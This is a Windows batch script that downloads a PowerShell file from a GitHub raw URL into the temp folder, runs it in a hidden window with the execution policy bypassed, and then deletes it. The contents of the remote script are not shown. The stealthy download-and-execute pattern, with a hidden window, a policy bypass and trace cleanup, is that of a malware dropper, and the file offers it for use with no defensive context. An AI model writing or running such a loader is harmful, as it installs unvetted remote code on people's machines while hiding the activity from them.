@echo off
set TEMP_DIR=%TEMP%

:: Download the .ps1 script to the %TEMP% folder
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/madhead341/KickAss/refs/heads/main/main.ps1', '%TEMP%\script.ps1')"

:: Run the .ps1 script in a hidden window
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\script.ps1"

:: Clean up the script file after execution
del "%TEMP%\script.ps1"
